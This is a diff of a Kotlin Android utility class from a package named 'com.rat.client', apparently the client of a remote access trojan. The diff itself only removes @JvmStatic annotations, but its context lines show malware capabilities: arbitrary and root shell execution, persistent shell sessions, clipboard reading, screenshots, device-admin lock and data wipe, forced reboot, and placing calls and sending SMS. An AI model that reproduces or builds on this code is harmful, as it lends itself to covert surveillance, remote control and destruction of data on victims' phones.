@@ -46,7 +46,7 @@ class SystemUtils private constructor() {
         private var context: Context? = null
         private val shellSessions = mutableMapOf<String, ShellSession>()
 
-        @JvmStatic
+        
         fun init(appContext: Context) {
             context = appContext.applicationContext
         }
@@ -56,7 +56,7 @@ class SystemUtils private constructor() {
 
         // ===== System Info =====
 
-        @JvmStatic
+        
         fun getSystemInfo(context: Context): Map<String, Any> {
             val info = mutableMapOf<String, Any>()
 
@@ -253,7 +253,7 @@ class SystemUtils private constructor() {
 
         // ===== Shell Execution =====
 
-        @JvmStatic
+        
         fun executeShellCommand(command: String, timeoutMs: Long = 30000): Map<String, Any> {
             return try {
                 val process = Runtime.getRuntime().exec(command)
@@ -294,7 +294,7 @@ class SystemUtils private constructor() {
             }
         }
 
-        @JvmStatic
+        
         fun executeInteractiveShell(sessionId: String, command: String): Map<String, Any> {
             var session = shellSessions[sessionId]
             if (session == null) {
@@ -304,7 +304,7 @@ class SystemUtils private constructor() {
             return session.execute(command)
         }
 
-        @JvmStatic
+        
         fun closeShellSession(sessionId: String): Boolean {
             return shellSessions.remove(sessionId)?.close() ?: false
         }
@@ -378,7 +378,7 @@ class SystemUtils private constructor() {
 
         // ===== Root Commands =====
 
-        @JvmStatic
+        
         fun executeRootCommand(command: String): Map<String, Any> {
             return try {
                 val process = Runtime.getRuntime().exec("su")
@@ -410,14 +410,14 @@ class SystemUtils private constructor() {
             }
         }
 
-        @JvmStatic
+        
         fun isRootAvailable(): Boolean {
             return executeRootCommand("id").let { (it["exit_code"] as? Int ?: -1) == 0 }
         }
 
         // ===== Clipboard =====
 
-        @JvmStatic
+        
         fun getClipboardText(context: Context): Map<String, Any> {
             val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
             if (clipboard.hasPrimaryClip()) {
@@ -430,7 +430,7 @@ class SystemUtils private constructor() {
             return mapOf("text" to "", "has_text" to false)
         }
 
-        @JvmStatic
+        
         fun setClipboardText(context: Context, text: String): Boolean {
             try {
                 val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
@@ -445,7 +445,7 @@ class SystemUtils private constructor() {
 
         // ===== Notifications =====
 
-        @JvmStatic
+        
         fun sendNotification(context: Context, title: String, text: String): Boolean {
             try {
                 val intent = Intent(context, MainActivity::class.java).apply {
@@ -486,7 +486,7 @@ class SystemUtils private constructor() {
 
         // ===== Screenshot =====
 
-        @JvmStatic
+        
         fun takeScreenshot(view: View): Bitmap? {
             return try {
                 val bitmap = Bitmap.createBitmap(view.width, view.height, Bitmap.Config.ARGB_8888)
@@ -499,7 +499,7 @@ class SystemUtils private constructor() {
             }
         }
 
-        @JvmStatic
+        
         fun bitmapToBase64(bitmap: Bitmap): String {
             val baos = java.io.ByteArrayOutputStream()
             bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos)
@@ -508,7 +508,7 @@ class SystemUtils private constructor() {
 
         // ===== Package Management =====
 
-        @JvmStatic
+        
         fun getPackageInfo(context: Context, packageName: String): Map<String, Any>? {
             return try {
                 val pm = context.packageManager
@@ -535,7 +535,7 @@ class SystemUtils private constructor() {
             }
         }
 
-        @JvmStatic
+        
         fun getIntentActivities(context: Context, action: String): List<Map<String, Any>> {
             val pm = context.packageManager
             val intent = Intent(action)
@@ -564,14 +564,14 @@ class SystemUtils private constructor() {
 
         // ===== Device Admin =====
 
-        @JvmStatic
+        
         fun isDeviceAdminActive(context: Context): Boolean {
             val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
             val adminComponent = ComponentName(context, com.rat.client.receiver.DeviceAdminReceiverImpl::class.java)
             return dpm.isAdminActive(adminComponent)
         }
 
-        @JvmStatic
+        
         fun lockDevice(context: Context): Boolean {
             val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
             val adminComponent = ComponentName(context, com.rat.client.receiver.DeviceAdminReceiverImpl::class.java)
@@ -582,7 +582,7 @@ class SystemUtils private constructor() {
             return false
         }
 
-        @JvmStatic
+        
         fun wipeData(context: Context): Boolean {
             val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
             val adminComponent = ComponentName(context, com.rat.client.receiver.DeviceAdminReceiverImpl::class.java)
@@ -595,7 +595,7 @@ class SystemUtils private constructor() {
 
         // ===== Reboot/Shutdown =====
 
-        @JvmStatic
+        
         fun reboot(context: Context): Boolean {
             val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
             val adminComponent = ComponentName(context, com.rat.client.receiver.DeviceAdminReceiverImpl::class.java)
@@ -607,7 +607,7 @@ class SystemUtils private constructor() {
             return executeRootCommand("reboot")["exit_code"] == 0
         }
 
-        @JvmStatic
+        
         fun shutdown(context: Context): Boolean {
             val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
             val adminComponent = ComponentName(context, com.rat.client.receiver.DeviceAdminReceiverImpl::class.java)
@@ -620,7 +620,7 @@ class SystemUtils private constructor() {
 
         // ===== Intent Helpers =====
 
-        @JvmStatic
+        
         fun openUrl(context: Context, url: String): Boolean {
             try {
                 val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
@@ -633,7 +633,7 @@ class SystemUtils private constructor() {
             }
         }
 
-        @JvmStatic
+        
         fun makeCall(context: Context, number: String): Boolean {
             try {
                 val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$number"))
@@ -646,7 +646,7 @@ class SystemUtils private constructor() {
             }
         }
 
-        @JvmStatic
+        
         fun sendSms(context: Context, number: String, text: String): Boolean {
             try {
                 val smsManager = android.telephony.SmsManager.getDefault()
